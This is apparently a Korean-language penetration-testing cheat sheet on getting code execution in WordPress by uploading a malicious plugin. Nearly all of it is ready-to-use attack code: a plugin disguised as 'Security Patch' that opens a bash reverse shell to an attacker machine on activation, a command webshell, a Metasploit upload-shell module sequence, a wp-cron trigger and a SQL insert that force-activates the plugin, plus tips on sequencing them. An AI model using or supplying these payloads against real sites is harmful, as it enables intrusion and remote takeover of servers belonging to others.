# 04_플러그인업로드_RCE

# WordPress — 악성 플러그인 업로드 (RCE)

테마 편집기가 비활성화됐거나 파일이 read-only일 때 사용. 악성 PHP를 플러그인으로 위장해 업로드.

---

## 수동 플러그인 생성

```bash
# 1단계: 플러그인 디렉터리 생성
mkdir evil-plugin

# 2단계: 플러그인 PHP 파일 작성 (WordPress 플러그인 형식 필요)
cat > evil-plugin/evil-plugin.php << 'EOF'
<?php
/*
Plugin Name: Security Patch
Plugin URI: http://example.com
Description: Security enhancement
Version: 1.0
Author: Admin
*/

exec("bash -c 'bash -i >& /dev/tcp/<칼리IP>/4444 0>&1'");
?>
EOF

# 3단계: zip 압축
zip -r evil-plugin.zip evil-plugin/

# 4단계: 업로드
# wp-admin → Plugins → Add New → Upload Plugin → evil-plugin.zip → Install Now → Activate
# Activate 클릭 시 PHP 코드 실행됨
```

---

## 웹쉘로 먼저 확인

```php
<?php
/*
Plugin Name: Test Plugin
*/
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

```bash
# 활성화 후 직접 접근
http://<IP>/wp-content/plugins/evil-plugin/evil-plugin.php?cmd=id
```

---

## Metasploit 자동화

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <IP>
set TARGETURI /
set USERNAME admin
set PASSWORD password123
set LHOST <칼리IP>
set LPORT 4444
exploit
```

---

## wp-cron.php 트리거

```bash
# 플러그인에 액션 훅으로 페이로드 삽입 후
curl "http://<IP>/wp-cron.php?doing_wp_cron"
```

---

## DB 직접 플러그인 등록 (mysql 접근 가능 시)

```sql
INSERT INTO wp_options (option_name, option_value, autoload)
VALUES ('active_plugins', 'a:1:{i:0;s:30:"evil-plugin/evil-plugin.php";}', 'yes')
ON DUPLICATE KEY UPDATE option_value = 'a:1:{i:0;s:30:"evil-plugin/evil-plugin.php";}';
```

---

## 팁

- 플러그인 파일은 `/wp-content/plugins/<플러그인명>/` 에 저장됨
- Activate 시 바로 코드 실행 → 리스너를 먼저 열어둬야 함
- 웹쉘로 먼저 연결 확인 후 리버스쉘 실행 권장